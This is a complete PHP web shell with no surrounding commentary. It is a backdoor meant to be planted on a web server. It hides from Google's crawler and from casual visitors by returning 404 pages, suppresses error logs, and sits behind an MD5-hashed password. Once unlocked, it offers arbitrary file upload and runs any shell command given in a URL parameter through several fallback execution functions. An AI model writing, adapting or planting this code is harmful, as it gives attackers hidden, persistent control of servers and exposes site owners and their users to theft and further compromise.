<?php
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
	header('HTTP/1.0 404 Not Found');
	exit;
}
$auth_pass = "99cbbc16c290d7024f7bcac74283a516";
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
function printLogin() {
	?>
	<center>
	<form method=post>
	Password: <input type=password name=pass><input type=submit value='>>'>
	</form></center>
	<?php
	exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) {
	if( empty( $auth_pass ) || ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) {
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	} else {
		printLogin();
	}
}
if(isset($_GET['act'])) {
	$action = trim($_GET['act']);
	switch($action)
	{
		case 'uploader':
			echo '<b>'.php_uname().'</b><br>';
			echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
			echo '<input name="uploadto" type="text" size="80" value="'.getcwd().'"><br />';
			echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
			if( $_POST['_upl'] == "Upload" ) {
				if(@copy($_FILES['file']['tmp_name'], $_POST['uploadto'].'/'.$_FILES['file']['name'])) {
					echo '<b>Upload success!</b><br>'.$_POST['uploadto']."/".$_FILES['file']['name']; 
				} else { 
					echo '<b>Upload failed!</b>'; 
				}
			}
			break;
		case 'exec':
			if(isset($_GET['cmd'])) 
			{
				$cmd = $_GET['cmd'];
				echo '<pre>';
				echo ex($cmd);
				echo '</pre>';
			} else {
				die('No command to be executed!');
			}
			break;
		default: 
			header("HTTP/1.0 404 Not Found");
			break;
	}
} else {
	header("HTTP/1.0 404 Not Found");
}
function ex($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
?>